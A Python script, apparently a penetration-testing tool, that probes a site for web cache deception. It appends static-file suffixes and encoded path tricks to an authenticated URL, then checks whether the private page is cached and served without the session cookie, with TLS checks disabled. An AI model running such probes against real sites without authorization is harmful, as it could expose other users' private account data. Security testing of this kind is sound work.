#!/usr/bin/env python3
"""
wcd_test.py — Web Cache Deception tester (HOST_HEADER_INJECTION_TESTING_GUIDE.md §12.2).

WCD: the origin returns the SAME authenticated page for a path with a "static-looking" suffix, and the cache
caches by extension regardless of auth → a victim's PRIVATE response gets cached at a URL anyone can read.

This script, given an AUTHENTICATED page URL + your OWN session cookie, appends static suffixes and checks whether
the response is (a) the private page, (b) CACHED (Age / X-Cache: hit), and (c) READABLE WITHOUT the cookie.
If all three hold → Web Cache Deception (your own account proves it; never harvest real users).

Authorized testing only. Usage:
  python3 wcd_test.py -u https://target/account/info -c "session=YOUROWNCOOKIE" --marker "your-email@x"
"""
import argparse, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0"
SUFFIXES = [
    "/nonexistent.css", "/x.js", "/x.jpg", "/x.png", "/x.ico", "/x.css",
    ";x.css", "%2Fx.css", "?x.css", "/%2e%2e/x.css", "/x.css?",
]

def cache_hit(r):
    bits = []
    if r.headers.get("Age"):
        bits.append("Age=" + r.headers["Age"])
    xc = r.headers.get("X-Cache") or r.headers.get("CF-Cache-Status") or r.headers.get("X-Cache-Status")
    if xc:
        bits.append("X-Cache=" + xc)
    cc = r.headers.get("Cache-Control") or ""
    if "public" in cc.lower() or "max-age" in cc.lower():
        bits.append("CC=" + cc)
    return bits

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="an AUTHENTICATED page, e.g. https://t/account/info")
    ap.add_argument("-c", "--cookie", required=True, help="YOUR OWN session cookie header value")
    ap.add_argument("--marker", help="a string that only appears in YOUR private page (email/username/id)")
    ap.add_argument("--timeout", type=float, default=12)
    a = ap.parse_args()
    base = a.url.rstrip("/")

    print(f"[*] base authenticated page: {base}")
    print(f"[*] marker (private-content proof): {a.marker or '(none — set --marker for a stronger signal)'}\n")

    for suf in SUFFIXES:
        url = base + suf
        try:
            # 1) authenticated request (with YOUR cookie) — does the origin return the private page + does the cache store it?
            r1 = requests.get(url, headers={"User-Agent": UA, "Cookie": a.cookie},
                              timeout=a.timeout, verify=False, allow_redirects=False)
            priv = (a.marker in r1.text) if a.marker else (r1.status_code == 200)
            ch = cache_hit(r1)
            # 2) UNAUTHENTICATED request to the same URL — is the private response served from cache?
            r2 = requests.get(url, headers={"User-Agent": UA}, timeout=a.timeout, verify=False, allow_redirects=False)
            leaked = (a.marker in r2.text) if a.marker else (r2.status_code == 200 and len(r2.text) > 200)
        except Exception as e:
            print(f"[err] {suf}: {e}")
            continue

        if priv and leaked:
            print(f"[WCD!] {url}")
            print(f"       authed→private({r1.status_code}) cache:[{', '.join(ch) or '?'}]  |  unauth→LEAKED({r2.status_code})")
            print(f"       → the private page is cached and readable WITHOUT auth = Web Cache Deception (High–Critical).")
        elif priv and ch:
            print(f"[maybe] {url}  private+cacheable (cache:[{', '.join(ch)}]) but unauth read not confirmed — retry/warm cache.")
        else:
            print(f"[ .. ] {url}  (authed-private={priv}, cache={bool(ch)}, unauth-leak={leaked})")

    print("\n[!] Confirm with YOUR OWN account only. If WCD: report the cached private URL + the leaked field (redacted).")
    print("    Never request/store other users' cached pages.")

if __name__ == "__main__":
    main()
